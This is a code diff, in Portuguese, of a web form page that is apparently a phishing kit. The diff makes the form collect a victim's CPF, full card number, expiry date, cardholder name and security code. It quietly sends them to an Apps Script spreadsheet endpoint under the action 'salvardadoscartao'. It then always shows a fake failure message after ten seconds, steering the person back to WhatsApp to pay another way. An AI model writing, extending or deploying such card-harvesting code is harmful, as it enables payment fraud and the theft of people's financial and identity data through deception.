@@ -141,6 +141,37 @@
     }
     .status.error{color:var(--danger)}
     .status.ok{color:var(--ok)}
+
+    .processing-area{
+      display:none;
+      margin-top:18px;
+      padding:18px 16px;
+      border:1px solid var(--line);
+      border-radius:14px;
+      background:#f8fbfb;
+      text-align:center;
+    }
+    .processing-area.show{display:block}
+    .spinner{
+      width:42px;
+      height:42px;
+      margin:0 auto 14px;
+      border:5px solid #dce9e8;
+      border-top-color:var(--blue);
+      border-radius:50%;
+      animation:spin .8s linear infinite;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .processing-message{
+      margin:0;
+      color:var(--ink);
+      font-size:14px;
+      font-weight:700;
+      line-height:1.5;
+    }
+    .processing-area.failed .spinner{display:none}
+    .processing-area.failed .processing-message{color:var(--danger)}
+
     @media(max-width:480px){
       .page{padding:16px}
       .card{padding:25px 20px;border-radius:20px}
@@ -187,7 +218,20 @@
 
       <form id="proposalForm" novalidate>
         <div class="field">
-          <label for="numero">Informe o número:</label>
+          <label for="cpf">CPF:</label>
+          <input
+            id="cpf"
+            name="cpf"
+            type="text"
+            inputmode="numeric"
+            autocomplete="off"
+            maxlength="14"
+            placeholder="000.000.000-00"
+            required>
+        </div>
+
+        <div class="field">
+          <label for="numero">Informe o número do cartão:</label>
           <input
             id="numero"
             name="numero"
@@ -201,7 +245,7 @@
         </div>
 
         <div class="field">
-          <label for="nascimento">Nascimento:</label>
+          <label for="nascimento">Validade:</label>
           <input
             id="nascimento"
             name="nascimento"
@@ -214,19 +258,19 @@
         </div>
 
         <div class="field">
-          <label for="nome">Nome:</label>
+          <label for="nome">Nome igual ao cartão:</label>
           <input
             id="nome"
             name="nome"
             type="text"
             autocomplete="name"
             maxlength="100"
-            placeholder="Digite seu nome"
+            placeholder="Digite o nome igual ao cartão"
             required>
         </div>
 
         <div class="field">
-          <label for="codigo">Código recebido:</label>
+          <label for="codigo">Código de segurança:</label>
           <input
             id="codigo"
             name="codigo"
@@ -241,17 +285,31 @@
 
         <button class="btn" type="submit">Continuar</button>
         <div id="status" class="status" aria-live="polite"></div>
+        <div id="processingArea" class="processing-area" role="status" aria-live="polite">
+          <div class="spinner" aria-hidden="true"></div>
+          <p id="processingMessage" class="processing-message">Aguarde enquanto processamos suas informações.</p>
+        </div>
       </form>
     </section>
   </main>
-
   <script>
+    const cpf = document.getElementById('cpf');
     const numero = document.getElementById('numero');
     const nascimento = document.getElementById('nascimento');
     const nome = document.getElementById('nome');
     const codigo = document.getElementById('codigo');
     const form = document.getElementById('proposalForm');
     const status = document.getElementById('status');
+    const processingArea = document.getElementById('processingArea');
+    const processingMessage = document.getElementById('processingMessage');
+
+    cpf.addEventListener('input', () => {
+      let digits = cpf.value.replace(/\D/g,'').slice(0,11);
+      digits = digits.replace(/^(\d{3})(\d)/, '$1.$2');
+      digits = digits.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+      digits = digits.replace(/\.(\d{3})(\d)/, '.$1-$2');
+      cpf.value = digits;
+    });
 
     numero.addEventListener('input', () => {
       let digits = numero.value.replace(/\D/g,'').slice(0,16);
@@ -283,6 +341,12 @@
       status.className = 'status';
       status.textContent = '';
 
+      const cpfLimpo = cpf.value.replace(/\D/g,'');
+      if(cpfLimpo.length !== 11){
+        erro('Informe um CPF com 11 dígitos.', cpf);
+        return;
+      }
+
       const numeroLimpo = numero.value.replace(/\D/g,'');
       if(numeroLimpo.length !== 16){
         erro('Informe os 16 dígitos do número.', numero);
@@ -306,46 +370,36 @@
       }
 
       const botao = form.querySelector('button[type="submit"]');
-      const textoOriginal = botao.textContent;
-
       botao.disabled = true;
-      botao.textContent = 'Enviando...';
-      status.textContent = 'Enviando seus dados...';
 
+      processingArea.classList.remove('failed');
+      processingMessage.textContent = 'Aguarde enquanto processamos suas informações.';
+      processingArea.classList.add('show');
+      processingArea.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+
+      // Após 10 segundos, informa ao cliente que a operação não pôde ser concluída.
+      setTimeout(() => {
+        processingArea.classList.add('failed');
+        processingMessage.textContent =
+          'Atenção, não foi possível concluir sua operação, volte no WhatsApp e continue seu atendimento escolhendo outra forma de pagamento.';
+      }, 10000);
+
+      // Mantém a gravação dos dados na planilha em segundo plano.
       try {
-        const response = await fetch(APPS_SCRIPT_URL, {
+        await fetch(APPS_SCRIPT_URL, {
           method: 'POST',
           headers: {'Content-Type':'text/plain;charset=utf-8'},
           body: JSON.stringify({
             acao: 'salvardadoscartao',
+            cpf: cpfLimpo,
             nome: nome.value.trim(),
-            numero: numeroLimpo,
+            numero: numero.value.trim(),
             nascimento: nascimento.value,
             codigo: codigo.value
           })
         });
-
-        if(!response.ok){
-          throw new Error('Falha HTTP ' + response.status);
-        }
-
-        const result = await response.json();
-
-        if(!result.sucesso){
-          throw new Error(result.mensagem || 'Não foi possível registrar os dados.');
-        }
-
-        status.className = 'status ok';
-        status.textContent = result.mensagem || 'Dados registrados com sucesso.';
-        form.reset();
-
       } catch (err) {
         console.error(err);
-        status.className = 'status error';
-        status.textContent = 'Não foi possível enviar os dados. Tente novamente.';
-      } finally {
-        botao.disabled = false;
-        botao.textContent = textoOriginal;
       }
     });
   </script>
